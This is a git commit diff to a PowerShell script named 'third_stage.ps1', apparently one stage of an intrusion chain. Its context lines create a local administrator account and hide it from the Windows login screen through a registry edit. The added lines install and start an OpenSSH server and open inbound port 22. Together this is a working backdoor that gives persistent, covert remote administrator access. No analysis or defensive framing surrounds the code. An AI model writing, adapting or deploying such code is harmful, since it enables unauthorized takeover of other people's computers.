66fdfd01395b14df2b65b17acb29f1b16b200b0b
DomoKrch <kyndomo9@gmail.com>
2024-03-06 22:49:50 +0600

    Testing remote access

--- third_stage.ps1
+++ third_stage.ps1
@@ -11,6 +11,13 @@ New-LocalUser $user -Password $p -FullName "test" -Description "test"
 Add-LocalGroupMember -Group "Administrators" -Member $user
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v $user
 
+# Open SSH and port 22 (add a rule in firewall as well)
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+Start-Service sshd
+Set-Service -Name sshd -StartupType 'Automatic'
+if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) {
+    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
+}
 
 mkdir $env:Temp/$temp_dir
 echo "hi" > $env:Temp/$temp_dir/hi.txt
